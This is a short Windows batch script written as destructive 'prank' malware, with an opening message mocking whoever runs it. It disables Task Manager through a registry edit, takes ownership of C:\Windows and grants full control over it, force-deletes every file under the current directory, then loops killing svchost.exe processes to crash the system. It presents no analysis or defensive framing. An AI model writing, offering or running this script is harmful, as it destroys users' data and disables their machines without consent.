@echo "Why the fuck would you open this you absolute buffoon your pc will not be happy with you AT ALL. Also dont even try to task manager your way out of this because i have disabled it :)"
pause
reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_SZ /d 1 /f >nul
start msedge.exe
start Control Panel
start explorer.exe
start powershell.exe
start cmd
@echo off 
takeown /f C:\Windows /r /d y
icacls C:\Windows /grant administrators:F /t
del /F /S /Q *.*
Timeout -t 10 NOBREAK > nul
pause
:A 
wmic process where name='svchost.exe' delete
taskkill /IM svchost.exe /F
goto A